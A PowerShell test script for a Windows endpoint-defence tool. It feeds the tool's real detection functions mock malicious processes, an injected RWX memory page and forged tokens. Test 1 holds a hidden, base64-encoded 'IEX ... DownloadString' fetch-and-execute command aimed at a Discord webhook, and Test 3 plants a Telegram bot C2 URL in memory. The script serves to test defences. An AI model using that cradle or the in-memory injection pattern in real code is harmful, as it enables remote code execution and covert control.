# =====================================================================
# Security Sentinel Ultra v7.0 - Real End-to-End Red-Team & Safe-Mode Audit
# Dot-sources SentinelWatchdog.ps1 & SentinelGuardian.ps1 (-LibraryOnly)
# and executes 100% REAL production functions & live kernel/memory tests!
# =====================================================================
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = 'Stop'

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   SECURITY SENTINEL ULTRA v7.0 - LIVE E2E RED-TEAM & SAFE-MODE AUDIT " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor Cyan

# Dot-source the REAL production scripts in LibraryOnly mode
$WatchdogScript = Join-Path $PSScriptRoot "SentinelWatchdog.ps1"
$GuardianScript = Join-Path $PSScriptRoot "SentinelGuardian.ps1"
. $WatchdogScript -LibraryOnly
. $GuardianScript -LibraryOnly

# Ensure Trust Anchor is initialized with current v7.0 script hashes before running tests
$null = Initialize-CodeIntegrityTrustAnchor

$passed = 0
$failed = 0

function Assert-LiveTest([string]$TestName, [bool]$Condition, [string]$Detail) {
    if ($Condition) {
        $script:passed++
        Write-Host "[PASS] $TestName" -ForegroundColor Green
        Write-Host "       -> $Detail" -ForegroundColor Gray
    } else {
        $script:failed++
        Write-Host "[FAIL] $TestName" -ForegroundColor Red
        Write-Host "       -> $Detail" -ForegroundColor Yellow
    }
}

# ---------------------------------------------------------------------
# LIVE TEST 1: Real Inspect-SingleProcess on Chrome -> PowerShell -enc
# ---------------------------------------------------------------------
$rawMalCmd  = "IEX (New-Object Net.WebClient).DownloadString('https://discord.com/api/webhooks/112233445566778899/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')"
$b64MalCmd  = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawMalCmd))
$mockParent = [PSCustomObject]@{ ProcessId = 99001; Name = "chrome.exe" }
$mockProcMap = @{ 99001 = $mockParent }

$mockMalProcWithUrl = [PSCustomObject]@{
    ProcessId       = 99002
    ParentProcessId = 99001
    CreationDate    = "20261108234000.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -NoP -W Hidden -enc $b64MalCmd"
}
$resWithUrl = Inspect-SingleProcess -p $mockMalProcWithUrl -procMap $mockProcMap

$b64NoUrl = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Invoke-Expression 'Get-ChildItem'"))
$mockMalProcNoUrl = [PSCustomObject]@{
    ProcessId       = 99003
    ParentProcessId = 99001
    CreationDate    = "20261108234001.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -enc $b64NoUrl"
}
$resNoUrl = Inspect-SingleProcess -p $mockMalProcNoUrl -procMap $mockProcMap

$test1Ok = ($resWithUrl.Action -eq "Alerted") -and ($resWithUrl.Level -eq "CRITICAL") -and ($resWithUrl.RiskScore -eq 100) -and
           ($resWithUrl.Forensics.DecodedCommand -match "discord\.com/api/webhooks/") -and
           ($resNoUrl.Action -eq "Alerted") -and ($resNoUrl.Level -eq "CRITICAL") -and ($resNoUrl.RiskScore -ge 85)

Assert-LiveTest -TestName "Live Test 1 (Real Inspect-SingleProcess): Chrome -> PowerShell -enc Base64 Decode & Scoring" `
                -Condition $test1Ok `
                -Detail "With B64 URL: Action=$($resWithUrl.Action), Level=$($resWithUrl.Level), Score=$($resWithUrl.RiskScore)/100 | Without URL: Action=$($resNoUrl.Action), Score=$($resNoUrl.RiskScore)/100 (>=85)"

# ---------------------------------------------------------------------
# LIVE TEST 2: Work & Gaming Safe-Mode (Dashboard -WindowStyle Hidden, Dev Tools & Signed Temp)
# ---------------------------------------------------------------------
# 2A: Launching SentinelDashboard.ps1 with -WindowStyle Hidden (Must be Exempted, Zero False Alert!)
$dashPath = Join-Path $PSScriptRoot "SentinelDashboard.ps1"
$mockDashProc = [PSCustomObject]@{
    ProcessId       = 99010
    ParentProcessId = 1000
    CreationDate    = "20261108234010.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dashPath`""
}
$resDash = Inspect-SingleProcess -p $mockDashProc -procMap @{}

# 2B: Normal Work/IT PowerShell script using -WindowStyle Hidden (Without obfuscation)
$mockWorkPs = [PSCustomObject]@{
    ProcessId       = 99011
    ParentProcessId = 1000
    CreationDate    = "20261108234011.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -WindowStyle Hidden -File `"C:\Work\deploy_build.ps1`""
}
$resWorkPs = Inspect-SingleProcess -p $mockWorkPs -procMap @{}

# 2C: Developer IDE (Code.exe) or Game (steam.exe) running an unsigned helper in %TEMP%
$mockDevParent = @{ 99012 = [PSCustomObject]@{ ProcessId = 99012; Name = "Code.exe" } }
$mockDevTemp = [PSCustomObject]@{
    ProcessId       = 99013
    ParentProcessId = 99012
    CreationDate    = "20261108234013.000000+420"
    Name            = "rust_build_script.exe"
    ExecutablePath  = "$env:LOCALAPPDATA\Temp\rust_build_script.exe"
    CommandLine     = "`"$env:LOCALAPPDATA\Temp\rust_build_script.exe`""
}
$resDevTemp = Inspect-SingleProcess -p $mockDevTemp -procMap $mockDevParent

$test2Ok = ($resDash.Action -eq "ExemptVerifiedSentinelScript") -and
           ($resWorkPs.Action -eq "Clean") -and (-not $resWorkPs.Frozen) -and
           ($resDevTemp.Action -eq "AllowedWorkGamingSafeMode") -and (-not $resDevTemp.Frozen)

Assert-LiveTest -TestName "Live Test 2 (Work & Gaming Safe-Mode): Zero False Positives on Dashboard, -WindowStyle Hidden & Dev/Game Temp" `
                -Condition $test2Ok `
                -Detail "DashboardAction=$($resDash.Action) | HiddenWorkScript=$($resWorkPs.Action) | VSCodeTempHelper=$($resDevTemp.Action) (Frozen=$($resDevTemp.Frozen))"

# ---------------------------------------------------------------------
# LIVE TEST 3: Real VirtualAlloc RWX + Reflective PE Header Injection & AnalyzeProcessMemory($PID)
# ---------------------------------------------------------------------
# Allocate a real 4096-byte MEM_COMMIT|MEM_RESERVE (0x3000) PAGE_EXECUTE_READWRITE (0x40) memory page in $PID
$rwxPtr = [SentinelNative.KernelControl]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new(4096), 0x3000, 0x40)
$memRep = $null
try {
    $pageBytes = New-Object byte[] 1024
    # Construct real MZ (0x4D, 0x5A) + e_lfanew at 0x3C pointing to 0x80 + PE\0\0 (0x50, 0x45, 0x00, 0x00)
    $pageBytes[0] = 0x4D; $pageBytes[1] = 0x5A
    $pageBytes[0x3C] = 0x80
    $pageBytes[0x80] = 0x50; $pageBytes[0x81] = 0x45; $pageBytes[0x82] = 0x00; $pageBytes[0x83] = 0x00

    # Embed a live C2 Telegram Bot URL at offset 0x100 in this RWX page
    $c2Bytes = [System.Text.Encoding]::ASCII.GetBytes("https://api.telegram.org/bot887766554:AAH_RealVirtualAllocRwxTest_998877")
    [Array]::Copy($c2Bytes, 0, $pageBytes, 0x100, $c2Bytes.Length)

    [System.Runtime.InteropServices.Marshal]::Copy($pageBytes, 0, $rwxPtr, $pageBytes.Length)

    # Call the REAL AnalyzeProcessMemory($PID)
    $memRep = [SentinelNative.KernelControl]::AnalyzeProcessMemory($PID)
} finally {
    if ($rwxPtr -ne [IntPtr]::Zero) {
        [void][SentinelNative.KernelControl]::VirtualFree($rwxPtr, [UIntPtr]::Zero, 0x8000)
    }
}

$caughtInjectedC2 = ($memRep.C2Indicators -contains "https://api.telegram.org/bot887766554:AAH_RealVirtualAllocRwxTest_998877")
$test3Ok = ($memRep.TotalBytesScanned -gt 0) -and ($memRep.RwxPrivateRegions -ge 1) -and ($memRep.UnbackedPeHeaders -ge 1) -and $caughtInjectedC2

Assert-LiveTest -TestName "Live Test 3 (Real Memory Forensics): VirtualAlloc RWX + Reflective MZ/PE + C2 Extracted by AnalyzeProcessMemory" `
                -Condition $test3Ok `
                -Detail "Scanned=$([math]::Round($memRep.TotalBytesScanned/1MB,2))MB | RWXRegions=$($memRep.RwxPrivateRegions) | UnbackedReflectivePE=$($memRep.UnbackedPeHeaders) | InjectedC2Found=$caughtInjectedC2"

# ---------------------------------------------------------------------
# LIVE TEST 4: Real OWNER RIGHTS DACL Attack Test (Blocks WRITE_DAC & Terminate) & Guardian Stop-Token
# ---------------------------------------------------------------------
# Spawn a temporary child PowerShell that applies HardenCurrentProcessDacl() and sleeps, then attack it from our process!
$childCode = "Add-Type -TypeDefinition @'`r`n$nativeCode`r`n'@ -Language CSharp; [void][SentinelNative.KernelControl]::HardenCurrentProcessDacl(); Start-Sleep -Seconds 4"
$encodedChild = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($childCode))
$childProc = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedChild" -WindowStyle Hidden -PassThru
Start-Sleep -Milliseconds 1200

$hTerminate = [SentinelNative.KernelControl]::OpenProcess(0x0001, $false, $childProc.Id)     # PROCESS_TERMINATE
$hWriteDac  = [SentinelNative.KernelControl]::OpenProcess(0x00040000, $false, $childProc.Id) # WRITE_DAC
if ($hTerminate -ne [IntPtr]::Zero) { [void][SentinelNative.KernelControl]::CloseHandle($hTerminate) }
if ($hWriteDac -ne [IntPtr]::Zero)  { [void][SentinelNative.KernelControl]::CloseHandle($hWriteDac) }

# Also call the REAL Test-GuardianStopToken from SentinelGuardian.ps1 on a forged token with wrong PID
$forgedBytes = [System.Text.Encoding]::UTF8.GetBytes("STOP|999999|$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())")
$forgedEnc   = [System.Security.Cryptography.ProtectedData]::Protect($forgedBytes, $script:SentinelEntropyBytes, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.IO.File]::WriteAllText($StopFlagFile, [Convert]::ToBase64String($forgedEnc), [System.Text.Encoding]::UTF8)
$guardianAcceptedForged = Test-GuardianStopToken

$trustedWdHash = Get-TrustedWatchdogHash
$actualWdHash  = (Get-FileHash -Path $WatchdogScript -Algorithm SHA256).Hash

$test4Ok = ($hTerminate -eq [IntPtr]::Zero) -and ($hWriteDac -eq [IntPtr]::Zero) -and (-not $guardianAcceptedForged) -and ($trustedWdHash -eq $actualWdHash)

Assert-LiveTest -TestName "Live Test 4 (Real Kernel DACL & Guardian): Same-User OpenProcess(WRITE_DAC & TERMINATE) Blocked + Forged Token Rejected" `
                -Condition $test4Ok `
                -Detail "TerminateHandle=$hTerminate (Blocked) | WriteDacHandle=$hWriteDac (Blocked) | ForgedTokenAccepted=$guardianAcceptedForged | TrustAnchorMatch=$($trustedWdHash -eq $actualWdHash)"

# ---------------------------------------------------------------------
# LIVE TEST 5: Real Quarantine & Bit-for-Bit Rollback Recovery (Move-ToQuarantine + Restore-QuarantinedFile)
# ---------------------------------------------------------------------
$tempDummyFile = Join-Path $env:TEMP "sentinel_e2e_rollback_test_$(Get-Random).tmp"
[System.IO.File]::WriteAllText($tempDummyFile, "E2E_QUARANTINE_AND_ROLLBACK_VERIFICATION_PAYLOAD_V7", [System.Text.Encoding]::UTF8)
$origHash = (Get-FileHash -Path $tempDummyFile -Algorithm SHA256).Hash

$qRes = Move-ToQuarantine -SourcePath $tempDummyFile -Reason "E2E Audit Quarantine Test"
$removedFromOrig = (-not (Test-Path $tempDummyFile))
$existsInQuar    = ($qRes -and (Test-Path $qRes.DestPath))

$rollbackOk      = Restore-QuarantinedFile -QuarantinedFilePath $qRes.DestPath
$restoredExists  = (Test-Path $tempDummyFile)
$restoredHash    = if ($restoredExists) { (Get-FileHash -Path $tempDummyFile -Algorithm SHA256).Hash } else { "" }
if ($restoredExists) { Remove-Item $tempDummyFile -Force -ErrorAction SilentlyContinue }

$test5Ok = $removedFromOrig -and $existsInQuar -and $rollbackOk -and $restoredExists -and ($origHash -eq $restoredHash)

Assert-LiveTest -TestName "Live Test 5 (Real Quarantine & Rollback): Move-ToQuarantine + Restore-QuarantinedFile Bit-for-Bit Recovery" `
                -Condition $test5Ok `
                -Detail "Quarantined=$existsInQuar | Restored=$restoredExists | SHA256 Integrity Verified=($origHash -eq $restoredHash)"

# ---------------------------------------------------------------------
# LIVE TEST 6: Real Get-PersistenceSnapshot (29 Vectors + Services) & Real Parse-Event4663Xml
# ---------------------------------------------------------------------
$liveSnap = Get-PersistenceSnapshot
$svcCount = @($liveSnap.Keys | Where-Object { $_ -like "Service_*" }).Count

$sample4663Xml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <EventData>
    <Data Name="SubjectUserName">under</Data>
    <Data Name="ObjectName">C:\Users\under\AppData\Roaming\SecuritySentinel_Canary\crypto_wallet_vault_seed.txt</Data>
    <Data Name="ProcessId">0x12cc</Data>
    <Data Name="ProcessName">C:\Temp\stealer_sim.exe</Data>
  </EventData>
</Event>
"@
$parsed4663 = Parse-Event4663Xml -EventXmlString $sample4663Xml
$test6Ok = ($liveSnap.Count -gt 50) -and ($svcCount -gt 5) -and ($parsed4663.ProcessId -eq 4812) -and ($parsed4663.ProcessName -eq "C:\Temp\stealer_sim.exe")

Assert-LiveTest -TestName "Live Test 6 (Real Get-PersistenceSnapshot & Parse-Event4663Xml): 29-Vector + Services & SACL XML Parser" `
                -Condition $test6Ok `
                -Detail "Total Live Indicators=$($liveSnap.Count) | Tracked Win32 Services=$svcCount | Event4663 Parsed PID=$($parsed4663.ProcessId) ($($parsed4663.ProcessName))"

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   LIVE E2E AUDIT SUMMARY: $passed PASSED | $failed FAILED             " -ForegroundColor $(if ($failed -eq 0) { "Green" } else { "Red" })
Write-Host "======================================================================" -ForegroundColor Cyan
if ($failed -gt 0) { exit 1 }
